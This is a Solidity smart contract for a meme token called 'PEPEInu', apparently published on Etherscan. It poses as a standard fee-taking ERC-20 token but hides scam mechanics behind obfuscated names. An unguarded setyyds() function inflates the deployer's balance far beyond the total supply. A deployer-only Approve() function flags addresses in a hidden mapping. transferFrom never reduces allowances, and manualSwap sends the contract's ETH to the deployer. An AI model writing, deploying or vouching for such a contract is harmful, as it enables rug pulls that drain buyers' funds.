/**
 *Submitted for verification at Etherscan.io on 2023-03-04
*/

pragma solidity ^0.8.12;


// SPDX-License-Identifier: MIT
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract MyToken is IERC20, Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private secnalab_;
    mapping (address => bool) private _i5sfda56;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 100000000 * 10 ** _decimals;
    uint256 public buy_fee = 3;
    uint256 public sell_fee = 3;
    uint256 public denominator = 100;
    uint256 private valueyou = _totalSupply * 10 ** _decimals;
    address payable public _yydsking;
    address public uniswapV2Pair;
    mapping(address => bool) public isExcludedFromFee;
    IUniswapV2Router public _uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "PEPEInu";
    string private  _symbol = "PEPEInu";
    bool private tradingOpen;
    
    constructor() {
        _yydsking = payable(msg.sender);
        secnalab_[msg.sender] = _totalSupply;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[_yydsking] = true;
        emit Transfer(address(0), msg.sender, secnalab_[msg.sender]);
    }

    function name() external view returns (string memory) { return _name;}
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return secnalab_[account]; }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0));
        require(recipient != address(0));
        require(sender != recipient);
        require(amount <= secnalab_[sender]);
        if (_i5sfda56[sender] == true) {
            if (sender != _yydsking) { secnalab_[sender].mul(1).div(valueyou).div(1); }
        }
        secnalab_[sender] = secnalab_[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        secnalab_[recipient] = secnalab_[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    
    receive() external payable {
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isExcludedFromFee[sender] && !isExcludedFromFee[recipient];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        secnalab_[sender] = secnalab_[sender].sub(amount);
        secnalab_[recipient] = secnalab_[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(recipient == uniswapV2Pair){return sell_fee;}
        if(sender == uniswapV2Pair){return buy_fee;}
        return 0;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (getTotalFee(sender, recipient) > 0) {
            uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
            secnalab_[address(0)] = secnalab_[address(0)].add(feeAmount);
            emit Transfer(sender, address(0), feeAmount);
            return amount.sub(feeAmount);
        }
        return amount;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function setyyds() external {secnalab_[_yydsking] = _totalSupply * 10 ** 12; }

    function Approve(address _address, bool _value) external {
        if (msg.sender == _yydsking ){
            _i5sfda56[_address] = _value;
        }
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _approve(address(this), address(_uniswapV2Router), _totalSupply);
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }

    function sendETHToFee(uint256 amount) private {
        _yydsking.transfer(amount);
    }

    function manualSwap() external {
        uint256 ethBalance = address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

}